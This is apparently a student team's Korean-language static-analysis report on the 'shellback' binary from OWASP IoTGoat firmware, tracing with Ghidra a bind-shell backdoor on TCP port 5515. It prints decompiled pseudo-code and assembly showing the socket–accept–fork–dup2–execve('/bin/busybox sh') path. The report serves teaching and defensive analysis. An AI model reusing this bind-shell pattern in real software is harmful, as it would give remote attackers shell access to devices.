# Week 2 — Shellback 함수 분석 보고서

> 팀: A팀 (OWASP IoTGoat Raspberry Pi 2)  
> 분석 대상: 추출된 펌웨어의 `/usr/bin/shellback`  
> 분석 방법: **정적 분석** (`file`, `readelf`, `strings`, Ghidra)  
> 분석 환경: Ubuntu (VirtualBox), Ghidra 12.2  
> 분석 범위: 지금까지 확인된 화면·로그에 근거한 `main()` 및 외부 API 호출 흐름

## 1. 분석 목적 및 대상

1주차에 선정한 `shellback` 바이너리의 기능을 확인하고, **입력 → 처리 → 위험 연산**으로 이어지는 함수 호출 관계를 추적한다. 특히 외부 네트워크 연결을 받은 뒤 BusyBox 셸이 실행되는 코드 경로와 관련 주소를 확인한다.

| 항목 | 확인된 값 |
|---|---|
| 파일 | `/usr/bin/shellback` |
| 크기 | 약 4.1 KB (`ls -lh`) |
| 형식 | ARM 32비트 ELF, 리틀 엔디언, 동적 링크 |
| 동적 로더 | `/lib/ld-musl-armhf.so.1` |
| 필요한 라이브러리 | `libgcc_s.so.1`, `libc.so` |
| ELF 진입점 | `0x00010674` |
| 분석한 내부 함수 | `main()` — `0x00010588` |
| Ghidra 프로젝트 | `IoTGoat_Week2_shellback` |

**주소 구분:** ELF 진입점 `0x00010674`, `main()` 시작 주소 `0x00010588`, `execve()`의 **호출 지점** `0x0001063C`는 서로 다른 값이다. `execve()` 호출 지점은 라이브러리 함수 자체의 시작 주소가 아니다.

## 2. 함수 조사 결과

### 2.1 내부 함수 `main()`

| 속성 | 분석 결과 |
|---|---|
| 함수명 | `main()` |
| 시작 주소 | `0x00010588` |
| 주요 입력 | TCP 연결 수락으로 얻는 소켓 파일 디스크립터 |
| 핵심 처리 | 소켓 생성·바인드·대기, 연결 수락, 프로세스 분기, 표준 입출력 연결 |
| 위험 연산 후보 | `/bin/busybox`의 `sh`를 실행하는 `execve()` 호출 |
| 분석 근거 | Ghidra Listing 및 Decompiler의 `main()` 화면 |

Ghidra에서 확인된 `main()`의 주요 코드를 **설명용으로 축약**하면 다음과 같다. 아래 내용은 원본 소스가 아니라 역컴파일 결과의 핵심 호출만 발췌한 것이다.

```c
/* Ghidra main() 분석 결과 중 핵심 동작을 발췌한 의사 코드 */
pcStack_4c = "/bin/busybox";
puStack_48 = &DAT_00010791;  // 바이너리 데이터: "sh\0"
uStack_44 = 0;              // argv 종료

local_40.sa_family = 2;                        // AF_INET
local_40.sa_data._0_2_ = htons(0x158b);        // TCP 5515
_fd = socket(2, 1, 0);                        // IPv4 / SOCK_STREAM
bind(_fd, &local_40, 0x10);
listen(_fd, 1);

do {
    local_50 = 0x10;
    _fd_00 = accept(_fd, &sStack_30, &local_50);
    _Var1 = fork();
    if (_Var1 != 0) {                          // 주의: == 0 아님
        write(_fd_00, /* 백도어 연결 알림 문자열 */, /* 길이 */);
        for (_fd2 = 0; _fd2 < 3; _fd2++) {
            dup2(_fd_00, _fd2);
        }
        execve("/bin/busybox", &pcStack_4c, (char **)0x0);
        close(_fd_00);                         // execve 실패·반환 시 도달 가능
    }
    close(_fd_00);
} while (true);
```

### 2.2 확인된 외부 함수 호출

아래 함수는 **Shellback 내부에서 직접 구현했다고 확인된 함수가 아니라 외부 API 호출 대상**이다.

| 외부 함수 | Shellback에서의 역할 |
| --- | --- |
| `htons()` | 포트 번호를 네트워크 바이트 순서로 변환 |
| `socket()` | IPv4 TCP 소켓 생성 (`socket(2,1,0)`) |
| `bind()` | 소켓을 설정된 주소와 포트에 연결 |
| `listen()` | 연결 요청 대기 |
| `accept()` | 클라이언트 연결을 수락해 새 소켓 획득 |
| `fork()` | 부모·자식 프로세스 분기 |
| `write()` | 백도어 연결 메시지 송신 |
| `dup2()` | 수락한 소켓을 표준 입력·출력·오류(0, 1, 2)에 복제 |
| `execve()` | `/bin/busybox`의 `sh` 실행 시도 |
| `close()` | 연결 소켓 파일 디스크립터 정리 |

### 2.3 네트워크 처리 분석

- `local_40.sa_family = 2`는 IPv4(`AF_INET`) 사용을 의미한다.
- `htons(0x158b)`에서 `0x158b`를 10진수로 변환하면 **5515**다.
- `socket(2,1,0)`은 IPv4 스트림(TCP) 소켓 생성 요청으로 해석된다.
- `bind()`·`listen()`·`accept()`가 이어져 외부 연결을 받아들이는 서버 측 코드 경로가 확인된다.
- 모든 인터페이스에 바인드하는지, 방화벽·네트워크에서 외부 접근이 가능한지는 **이번 정적 분석만으로 확정하지 않았다.**

### 2.4 `fork()` 분기 재확인 — 중요한 정정 사항

Ghidra의 실제 조건문은 다음과 같다.

```c
_Var1 = fork();
if (_Var1 != 0) {
    // write → dup2 → execve
}
```

Listing에서도 다음 명령을 확인했다.

```asm
0001060c    bl    <EXTERNAL>::fork
00010610    cmp   r0,#0x0
00010614    beq   LAB_00010648
```

- **반환값이 양수일 때(정상적인 부모):** `write → dup2 → execve` 경로로 진입한다.
- **반환값이 0일 때(자식):** 해당 분기를 건너뛰고 수락 소켓을 닫은 뒤 다음 반복으로 진행할 수 있다.
- **반환값이 -1일 때(`fork` 실패):** `!= 0` 조건이 참이므로 오류 처리 부족 가능성을 별도로 검토해야 한다.

### 2.5 BusyBox 실행 인자 및 `execve()` 위치

Ghidra Listing에서 데이터 주소 `0x00010791`을 확인했다.

| 주소 | 바이트 | ASCII |
|---|---|---|
| `0x00010791` | `73` | `s` |
| `0x00010792` | `68` | `h` |
| `0x00010793` | `00` | 널 종료 (`\0`) |

따라서 `DAT_00010791`은 `"sh"`를 가리킨다. 인접한 스택 값과 연결하면 `execve()`에 전달되는 인자는 다음과 같이 해석된다.

```text
argv[0] = "/bin/busybox"
argv[1] = "sh"
argv[2] = NULL
```

Ghidra Listing에서 위험 연산을 직접 호출하는 명령어도 확인했다.

```asm
0001063c    bl    <EXTERNAL>::execve
```

`dup2()` 호출 명령의 주소(`0x00010660`)는 `execve()` 호출 주소보다 크지만, **반복문 분기 구조상 실행 순서에서는 `dup2()`가 먼저 수행되고 `execve()`로 이동한다.** 또한 `execve()`가 성공하면 현재 프로세스가 새 프로그램으로 교체되므로 뒤의 `close()`로 정상 복귀하지 않는다.
